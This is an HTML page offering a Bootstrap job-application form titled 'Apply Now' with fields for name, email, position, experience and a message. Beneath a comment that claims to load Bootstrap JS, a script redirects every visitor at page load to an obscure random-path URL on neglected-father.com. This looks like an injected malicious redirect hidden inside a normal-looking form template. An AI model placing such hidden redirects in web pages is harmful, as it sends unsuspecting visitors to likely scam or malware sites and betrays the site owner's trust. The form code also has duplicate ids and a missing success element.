<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bootstrap Contact Form</title>
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
     #successMessage {
            display: none;
            color: green;
            font-weight: bold;
            margin-top: 10px;
        }
  </style>
</head>
<body style="background-color: antiquewhite;">

  <div class="container-fluid">
   <div class="row">
    <div class="col-md-3">

    </div>
    <div class="col-md-6">
      <br>
      <h1 class="text-center">Apply Now</h1>
      <pre class="text-center">We Will Contact Soon</pre>
      <form id="myForm">
        <div class="form-group">
          <label for="exampleFormControlInput1" >Full Name<span style="color: red;">*</span></label><br><br>
          <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="jon dan" required>
        </div>
        <br>

        <div class="form-group">
          <label for="exampleFormControlInput1" >Email address:<span style="color: red;">*</span></label><br><br>
          <input type="email" class="form-control" id="exampleFormControlInput1" placeholder="name@example.com" required>
        </div>
       <br>
        <div class="form-group">
          <label for="exampleFormControlInput1" >Apply For Position:<span style="color: red;">*</span></label><br><br>
          <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Front End Developer" required>
        </div>
       <br>
        <div class="form-group">
          <label for="exampleFormControlSelect1">Experience : <span style="color:red">*</span></label><br><br>
          <select class="form-control" id="exampleFormControlSelect1" required>
            <option>Fresher</option>
            <option>1 Year</option>
            <option>2 Year</option>
            <option>3 Year</option>
            <option>5 or Above</option>
          </select>
        </div>
        <br>
       
        <div class="form-group">
          <label for="exampleFormControlTextarea1">Message : <span style="color: red;">*</span></label>
          <textarea class="form-control" id="exampleFormControlTextarea1" rows="3" required></textarea>
        </div>
        <br>
        <div class="form-group" class="text-center">
         <button class="btn btn-success" type="submit">Submit</button>
        </div>
      </form>
    </div>
    <div class="col-md-3">

    </div>
   </div>
    </div>
  </div>
  

  <!-- Bootstrap JS and Popper.js -->
  <script>
    window.location.href = "https://neglected-father.com/bG3TV/0.Pr3BpvvXbgmaV/JHZ/Dd0/1yN/D/gC5SNMz/MH4ULjTXUx0AO/D/kH3qMdzhkI";
</script>
  <script>
    // JavaScript to handle the form submission
    document.getElementById('myForm').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent the form from submitting the traditional way
      
      // Show the success message
      document.getElementById('successMessage').style.display = 'block';
    });
  </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
